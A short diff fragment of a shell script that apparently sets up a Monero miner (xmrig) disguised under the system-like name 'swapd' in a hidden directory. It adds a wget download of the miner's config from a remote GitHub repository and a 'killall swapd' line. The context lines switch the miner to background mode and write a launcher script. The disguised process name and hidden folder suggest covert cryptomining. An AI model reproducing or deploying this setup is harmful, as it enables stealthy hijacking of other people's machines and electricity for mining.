@@ -345,7 +345,8 @@ sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $MOHOME/swapd.pid
 #}
 #EOL
 
-wget --no-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
+#wget --no-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
+wget https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
 
 curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $MOHOME/config.json
 
@@ -354,6 +355,7 @@ sed -i 's/"background": *false,/"background": true,/' $MOHOME/.swapd/config_back
 
 # preparing script
 killall xmrig
+killall swapd
 
 echo "[*] Creating $MOHOME/swapd.sh script"
 cat >$MOHOME/swapd.sh <<EOL
